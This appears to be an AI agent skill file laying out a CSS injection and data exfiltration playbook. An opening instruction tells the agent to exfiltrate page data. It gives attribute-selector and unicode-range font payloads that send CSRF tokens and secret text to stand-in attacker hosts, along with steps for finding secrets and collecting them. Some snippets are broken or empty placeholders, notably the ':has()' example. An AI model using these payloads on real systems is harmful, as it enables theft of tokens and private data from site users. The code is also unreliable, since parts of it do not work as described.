---
name: css-injection-exfiltration
description: >-
  CSS injection and data exfiltration playbook. Use when HTML/style injection is possible but JavaScript is blocked — attribute-selector oracles, unicode-range font exfiltration, CSS custom properties, and modern style-token exfil chains.
---

# SKILL: CSS Injection & Data Exfiltration

> **AI LOAD INSTRUCTION**: Exfiltrate page data with zero JavaScript. Modern research ("CSS: the bomb inside your inbox", Aug 2026) revived this class for CSP-heavy apps. Covers attribute-selector brute-force, font/unicode-range exfiltration, :has() recursion, DOM re-styling to script-free data theft.

## 1. CORE CONCEPT

Injected CSS can't read the DOM directly, but selectors *match* on content and trigger network requests (`background:url()`). Chaining millions of selector-matches turns CSS into a read oracle: each character guessed correctly fires one request.

```
input[value^="a"] { background: url(//attacker.tld/a); }
input[value^="b"] { background: url(//attacker.tld/b); }
→ attacker sees which request lands = first char of a secret field
```

## 2. INJECTION POINTS

- User-controlled profile fields rendered into `style=""` attributes or `<style>` blocks
- Markdown/HTML sanitizers that allow `<style>` tags but strip `<script>`
- Email templates (HTML email = CSS injection paradise — no JS at all)
- Theme/customization features accepting raw CSS
- CSS-in-JS systems interpolating user strings into styles

## 3. EXFILTRATION TECHNIQUES

### 3.1 Attribute Selector Oracle (classic)
```css
/* Steal CSRF token char-by-char from <input name=csrf value="..."> */
input[name="csrf"][value^="`"]{--l0:`}
@font-face{font-family:l0;src:url(//atk/l0);}
```
Brute-force per position; needs page reload per char unless using lazy-loading tricks.

### 3.2 Font-Based Bulk Exfiltration (fast path)
```css
/* One request leaks MANY chars via glyph fallbacks */
@font-face{font-family:x;src:url(//atk/A.woff2);unicode-range:U+41;}
@font-face{font-family:x;src:url(//atk/B.woff2);unicode-range:U+42;}
.secret-text{font-family:x;}
/* Each distinct character in .secret-text fetches its glyph file →
   attacker reads the full string from access logs */
```

### 3.3 Infinite Recursion with :has() (modern)
```css
style { }  /* injected */
/* :has() lets selectors match on DOM structure → recursive rules
   re-trigger loads without reloads (post-2023 browsers) */
```

### 3.4 DOM Re-Styling Chains
Combine with dangling-markup or iframe inheritance when direct selectors can't reach the secret node.

## 4. METHODOLOGY

1. Confirm injection context: inside `<style>`? style attribute? which chars survive filtering?
2. Locate a high-value secret in DOM (CSRF token, email, API key in data-attribute)
3. Choose technique: attribute-oracle (slow, reliable) vs font-range (fast, needs text node)
4. Host collector: any HTTP logger distinguishing requested paths
5. Prove with 1–2 characters leaked, then report (don't mass-exfiltrate)

## 5. DEFENSES (for reports)

- CSP `style-src 'self'` (no unsafe-inline), sanitize CSS with a parser (allowlist properties, ban url()/@import/@font-face), isolate user content in sandboxed iframes, randomize secret field names per load

## 6. FALSE POSITIVE TRAPS

- Injected CSS reflected but never applied (sanitizer escapes later) — verify computed styles in browser
- CSP blocking remote fonts/loads kills exfil — check response headers first
- Same-origin-only url() policies make it DOM-restyle-only (still reportable, lower severity)

## REFERENCES
- "CSS: the bomb inside your inbox" (Aug 2026)
- PortSwigger Web Security Academy: CSS injection labs
